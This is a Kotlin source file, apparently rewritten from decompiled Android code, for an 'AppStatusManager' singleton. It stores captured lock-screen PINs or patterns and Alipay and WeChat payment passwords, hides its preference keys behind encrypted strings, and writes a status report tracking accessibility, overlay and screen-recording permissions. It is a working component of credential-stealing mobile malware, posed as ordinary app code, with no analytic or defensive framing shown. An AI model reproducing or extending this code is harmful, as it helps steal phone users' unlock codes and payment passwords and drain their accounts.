package com.storm.safe.rock.p000

import android.content.Context
import android.content.SharedPreferences
import android.os.Build
import android.util.Log
import com.storm.safe.rock.util.StringUtil
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * JADX: p000/C0107as.java (229 LOC) — Application status tracking singleton.
 *
 * Tracks installation status, lock screen password, Alipay/WeChat password capture,
 * and permission states via SharedPreferences. Writes a human-readable status file
 * to the app's files directory.
 *
 * Static fields (encrypted pref keys):
 * - f45611a4 → KEY_ALIPAY_CAPTURED: "alipay_password_captured" (encrypted)
 * - f45612a5 → KEY_WECHAT_CAPTURED: "wechat_password_captured" (encrypted)
 * - f45613a6 → KEY_LOCK_DETECTED: "lock_password_detected" (encrypted)
 * - f45614a7 → KEY_LOCK_TYPE: "lock_password_type" (encrypted)
 * - f45615a8 → KEY_LOCK_VALUE: "lock_password_value" (encrypted)
 * - f45616a9 → KEY_LOCK_CAPTURE_TIME: "lock_password_capture_time" (encrypted)
 *
 * Instance fields:
 * - f45618a0 → context
 * - f45619a1 → prefs (SharedPreferences "app_status")
 * - f45620a2 → dateFormat (yyyy-MM-dd HH:mm:ss)
 *
 * Methods:
 * - m210501a0() → generateStatusReport: builds human-readable status string
 * - m210502a1(long) → formatTimestamp: formats millis or returns "未记录"
 * - m210503a2() → getLockType: reads lock password type from prefs
 * - m210504a3() → readStatusFile: reads app_status.txt content
 * - m210505a4() → saveStatusFile: writes status report to app_status.txt
 * - m210506a5(type, captured, value) → saveAlipayPassword
 * - m210507a6(type, detected, value) → saveLockPassword
 * - m210508a7(type, captured, value) → saveWechatPassword
 *
 * Singleton:
 * - f45617b0 → instance (volatile)
 * - f45610a3 → lock object (C0106ar)
 * - getInstance(context) → double-check locking
 */
class AppStatusManager(context: Context) {

    companion object {
        private const val TAG = "AppStatusManager"
        private const val PREFS_NAME = "app_status"

        /**
         * JADX: f45611a4 — Encrypted key for Alipay captured flag.
         */
        @JvmStatic
        val KEY_ALIPAY_CAPTURED: String = StringUtil.decrypt("KlUYKkwhMz5WIjhOHihJBw8vRyU+SxQ+")

        /**
         * JADX: f45612a5 — Encrypted key for WeChat captured flag.
         */
        @JvmStatic
        val KEY_WECHAT_CAPTURED: String = StringUtil.decrypt("PFwSMkwsMz5WIjhOHihJBw8vRyU+SxQ+")

        /**
         * JADX: f45613a6 — Encrypted key for lock password detected flag.
         */
        @JvmStatic
        val KEY_LOCK_DETECTED: String = StringUtil.decrypt("J1YSMXIoDT1EJiRLFQVJPRgrVCUuXQ==")

        /**
         * JADX: f45614a7 — Encrypted key for lock password type.
         */
        @JvmStatic
        val KEY_LOCK_TYPE: String = StringUtil.decrypt("J1YSMXIoDT1EJiRLFQVZIRwr")

        /**
         * JADX: f45615a8 — Encrypted key for lock password value.
         */
        @JvmStatic
        val KEY_LOCK_VALUE: String = StringUtil.decrypt("J1YSMXIoDT1EJiRLFQVbOQA7Ug==")

        /**
         * JADX: f45616a9 — Encrypted key for lock password capture time.
         */
        @JvmStatic
        val KEY_LOCK_CAPTURE_TIME: String =
            StringUtil.decrypt("J1YSMXIoDT1EJiRLFQVOORw6QiMuZgUzQD0=")

        /**
         * JADX: f45617b0 — Volatile singleton instance.
         */
        @Volatile
        private var instance: AppStatusManager? = null

        /**
         * JADX: f45610a3 — Lock object (C0106ar).
         */
        private val lock = Any()

        /**
         * Get or create the singleton instance.
         * Uses double-checked locking as in the vendor code.
         */
        @JvmStatic
        fun getInstance(context: Context): AppStatusManager {
            return instance ?: synchronized(lock) {
                instance ?: AppStatusManager(context.applicationContext).also {
                    instance = it
                }
            }
        }

        /**
         * For testing only — reset the singleton.
         */
        @JvmStatic
        internal fun resetInstance() {
            instance = null
        }
    }

    /**
     * JADX: f45618a0 — Application context.
     */
    val context: Context = context

    /**
     * JADX: f45619a1 — SharedPreferences for app status.
     */
    val prefs: SharedPreferences = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)

    /**
     * JADX: f45620a2 — Date formatter.
     */
    val dateFormat: SimpleDateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())

    /**
     * JADX: m210501a0 → generateStatusReport.
     * Builds a comprehensive human-readable status report string.
     */
    fun generateStatusReport(): String {
        val sb = StringBuilder(
            "==========================================\n" +
                "       应用状态记录文件\n" +
                "==========================================\n"
        )
        sb.append("更新时间: ${dateFormat.format(Date())}")
        sb.append('\n')
        sb.append("设备型号: ${Build.MANUFACTURER} ${Build.MODEL}")
        sb.append('\n')
        sb.append("Android版本: ${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})")
        sb.append("\n\n========== 安装状态 ==========\n")
        sb.append("安装完成: ${prefs.getBoolean("installation_complete", false)}")
        sb.append('\n')
        sb.append("安装时间: ${formatTimestamp(prefs.getLong("installation_time", 0L))}")
        sb.append('\n')
        sb.append("首次启动: ${prefs.getBoolean("first_launch", true)}")
        sb.append("\n\n========== 配置状态 ==========\n")
        sb.append("配置完成: ${prefs.getBoolean("config_complete", false)}")
        sb.append('\n')
        sb.append("配置完成时间: ${formatTimestamp(prefs.getLong("config_complete_time", 0L))}")
        sb.append("\n\n========== 锁屏密码状态 ==========\n")
        sb.append("已检测: ${prefs.getBoolean(KEY_LOCK_DETECTED, false)}")
        sb.append('\n')
        sb.append("密码类型: ${getLockType()}")
        sb.append('\n')
        sb.append("是否4位PIN: ${getLockType() == "4pin"}")
        sb.append('\n')
        sb.append("是否6位PIN: ${getLockType() == "6pin"}")
        sb.append('\n')
        sb.append("是否图案: ${getLockType() == "pattern"}")
        sb.append('\n')
        sb.append("是否混合: ${getLockType() == "mixed"}")
        sb.append('\n')
        val lockValue = prefs.getString(KEY_LOCK_VALUE, "") ?: ""
        sb.append("密码值: ${if (lockValue.isNotEmpty()) "已获取" else "未获取"}")
        sb.append('\n')
        sb.append("获取时间: ${formatTimestamp(prefs.getLong(KEY_LOCK_CAPTURE_TIME, 0L))}")
        sb.append("\n\n========== 支付宝密码状态 ==========\n")
        sb.append("已捕获: ${prefs.getBoolean(KEY_ALIPAY_CAPTURED, false)}")
        sb.append('\n')
        val alipayType = prefs.getString("alipay_password_type", "none") ?: "none"
        sb.append("密码类型: $alipayType")
        sb.append('\n')
        val alipayValue = prefs.getString("alipay_password_value", "") ?: ""
        sb.append("密码值: ${if (alipayValue.isNotEmpty()) "已获取" else "未获取"}")
        sb.append('\n')
        sb.append("捕获时间: ${formatTimestamp(prefs.getLong("alipay_capture_time", 0L))}")
        sb.append("\n\n========== 微信密码状态 ==========\n")
        sb.append("已捕获: ${prefs.getBoolean(KEY_WECHAT_CAPTURED, false)}")
        sb.append('\n')
        val wechatType = prefs.getString("wechat_password_type", "none") ?: "none"
        sb.append("密码类型: $wechatType")
        sb.append('\n')
        val wechatValue = prefs.getString("wechat_password_value", "") ?: ""
        sb.append("密码值: ${if (wechatValue.isNotEmpty()) "已获取" else "未获取"}")
        sb.append('\n')
        sb.append("捕获时间: ${formatTimestamp(prefs.getLong("wechat_capture_time", 0L))}")
        sb.append("\n\n========== 权限状态 ==========\n")
        sb.append("无障碍服务: ${prefs.getBoolean("accessibility_enabled", false)}")
        sb.append('\n')
        sb.append("悬浮窗权限: ${prefs.getBoolean("overlay_enabled", false)}")
        sb.append('\n')
        sb.append("屏幕录制权限: ${prefs.getBoolean("media_projection_enabled", false)}")
        sb.append('\n')
        sb.append("系统设置权限: ${prefs.getBoolean("write_settings_enabled", false)}")
        sb.append(
            "\n\n==========================================\n" +
                "  使用说明:\n" +
                "  - 此文件记录应用的关键状态\n" +
                "  - 可用于条件判断和调试\n" +
                "  - 文件位置: /data/data/<包名>/files/\n" +
                "==========================================\n"
        )
        return sb.toString()
    }

    /**
     * JADX: m210502a1 → formatTimestamp.
     * Formats a millisecond timestamp to "yyyy-MM-dd HH:mm:ss", or "未记录" if <= 0.
     */
    fun formatTimestamp(timestamp: Long): String {
        if (timestamp <= 0) return "未记录"
        return dateFormat.format(Date(timestamp))
    }

    /**
     * JADX: m210503a2 → getLockType.
     * Returns the lock password type from SharedPreferences, defaulting to "none".
     */
    fun getLockType(): String {
        return prefs.getString(KEY_LOCK_TYPE, "none") ?: "none"
    }

    /**
     * JADX: m210504a3 → readStatusFile.
     * Reads the content of app_status.txt. Returns error message if file doesn't exist or read fails.
     */
    fun readStatusFile(): String {
        return try {
            val file = File(context.filesDir, "app_status.txt")
            if (file.exists()) {
                file.readText()
            } else {
                "状态文件不存在"
            }
        } catch (e: Exception) {
            Log.e(TAG, "读取状态文件失败", e)
            "读取失败: ${e.message}"
        }
    }

    /**
     * JADX: m210505a4 → saveStatusFile.
     * Writes the generated status report to app_status.txt.
     */
    fun saveStatusFile() {
        try {
            File(context.filesDir, "app_status.txt").writeText(generateStatusReport())
        } catch (e: Exception) {
            Log.e(TAG, "保存状态文件失败", e)
        }
    }

    /**
     * JADX: m210506a5 → saveAlipayPassword.
     * Saves Alipay password status to SharedPreferences and updates the status file.
     *
     * @param type Password type (e.g. "6digit", "4digit").
     * @param captured Whether the password has been captured.
     * @param value The password value.
     */
    fun saveAlipayPassword(type: String, captured: Boolean, value: String) {
        val editor = prefs.edit()
        editor.putBoolean(KEY_ALIPAY_CAPTURED, captured)
        editor.putString("alipay_password_type", type)
        editor.putString("alipay_password_value", value)
        if (captured) {
            editor.putLong("alipay_capture_time", System.currentTimeMillis())
        }
        editor.apply()
        saveStatusFile()
    }

    /**
     * JADX: m210507a6 → saveLockPassword.
     * Saves lock screen password status with complex merge logic from vendor:
     * - If detected=true but value is empty, try to keep existing value from prefs.
     * - If detected=true but type is "none"/"unknown", try to keep existing type.
     * - If detected=false, type is forced to "none".
     *
     * @param type Password type (e.g. "4pin", "6pin", "pattern", "mixed").
     * @param detected Whether the password has been detected.
     * @param value The password value.
     */
    fun saveLockPassword(type: String, detected: Boolean, value: String) {
        var actualValue = value
        var actualType = type

        if (!detected || (actualValue.isEmpty() && run {
                actualValue = prefs.getString(KEY_LOCK_VALUE, "") ?: ""
                actualValue
            }.isEmpty())) {
            // vendor: if not detected or no value available, use empty
            if (!detected) {
                actualValue = ""
            }
        }

        if (!detected || actualType == "none" || actualType == "unknown") {
            if (detected) {
                val existingType = getLockType()
                if (existingType != "none" && existingType != "unknown") {
                    actualType = existingType
                }
            } else {
                actualType = "none"
            }
        }

        val editor = prefs.edit()
        editor.putBoolean(KEY_LOCK_DETECTED, detected)
        editor.putString(KEY_LOCK_TYPE, actualType)
        editor.putString(KEY_LOCK_VALUE, actualValue)
        if (!detected || actualValue.isEmpty()) {
            editor.putLong(KEY_LOCK_CAPTURE_TIME, 0L)
        } else {
            editor.putLong(KEY_LOCK_CAPTURE_TIME, System.currentTimeMillis())
        }
        editor.apply()
        saveStatusFile()
    }

    /**
     * JADX: m210508a7 → saveWechatPassword.
     * Saves WeChat password status to SharedPreferences and updates the status file.
     *
     * @param type Password type (e.g. "6digit", "4digit").
     * @param captured Whether the password has been captured.
     * @param value The password value.
     */
    fun saveWechatPassword(type: String, captured: Boolean, value: String) {
        val editor = prefs.edit()
        editor.putBoolean(KEY_WECHAT_CAPTURED, captured)
        editor.putString("wechat_password_type", type)
        editor.putString("wechat_password_value", value)
        if (captured) {
            editor.putLong("wechat_capture_time", System.currentTimeMillis())
        }
        editor.apply()
        saveStatusFile()
    }
}
